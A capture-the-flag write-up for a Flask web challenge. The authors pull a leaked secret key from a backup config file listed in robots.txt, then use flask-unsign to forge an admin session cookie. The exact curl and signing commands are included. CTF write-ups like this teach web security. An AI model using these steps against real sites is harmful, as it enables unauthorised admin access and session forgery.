## Crest Portal — Web

First checked `/robots.txt` and found an interesting path:

```text
Disallow: /static/backup/
```

The directory itself gave a 404, so we did a quick Google search for which Flask backup files might contain the secret key. Found that `config.py.bak` was worth checking.

```bash
curl http://2.31.70.16:5100/static/backup/config.py.bak
```

And there it was:

```python
SECRET_KEY = "sup3r-s3cr3t-dev-key-2023"
```

We had already logged in with `alice:password123` and noticed the Flask session cookie contained `{"role":"user","username":"alice"}`.

Since we had the secret key, we simply used `flask-unsign` to sign a new cookie with the admin role:

```bash
flask-unsign --sign \
  --cookie "{'role':'admin','username':'alice'}" \
  --secret 'sup3r-s3cr3t-dev-key-2023'
```

Replaced the original session cookie with the generated one, refreshed `/dashboard`, and got access to the admin report. Flag obtained :)

**Basically:** exposed Flask secret key → forged admin session → flag.
